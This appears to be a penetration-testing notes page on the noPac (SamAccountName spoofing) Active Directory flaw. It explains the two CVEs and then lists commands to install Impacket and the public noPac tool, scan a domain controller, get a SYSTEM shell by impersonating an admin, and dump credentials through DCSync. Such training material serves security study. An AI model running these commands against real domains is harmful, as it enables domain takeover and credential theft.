
## NoPac (**SamAccountName** Spoofing)
A great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

| 2021-42278                                                                 | 2021-42287                                                                                    |
| -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

### Simplified Exploit Description
1. **Exploit Overview**:
    - Exploit changes a computer account's `SamAccountName` to match a Domain Controller's.
    - Authenticated users can add up to[ 10 computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain) by default.
    - Kerberos tickets are then requested, tricking the service into issuing tickets under the DC's name.
    - This leads to access as the DC service, potentially granting a SYSTEM shell on the Domain Controller.
    - The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
    - We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.
2. **Preparation**:
    - `noPac` uses Impacket for communication, payload uploads, and command execution.
3. **Setup Commands**:
 1.Ensure `Impacket` is installed:
``` shell
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
```
 2. Cloning the NoPac Exploit Repo
``` shell
git clone https://github.com/Ridter/noPac.git
```
### check if the system is vulnerable using a scanner
```shell
sudo python3 scanner.py DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -use-ldap
```
Results in success:
![image](https://github.com/user-attachments/assets/4af1d976-2d20-4824-9e4d-206d1ee0cf31)
### Running NoPac & Getting a SYSTEM Shell
```shell
sudo python3 noPac.py DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -dc-host DC_HOSTNAME -shell --impersonate ADMIN_USER -use-ldap
```
### Using NoPac to Perform a DCSync Attack:
```shell
sudo python3 noPac.py DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate ADMIN_USER -use-ldap -dump -just-dc-user DOMAIN/ADMIN_ACCOUNT
```
![image](https://github.com/user-attachments/assets/dc210d2b-862e-497b-b2b7-936f1e2afa66)

### **Key Notes**

Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using cd.
Use `dir path/to/navigate/it`
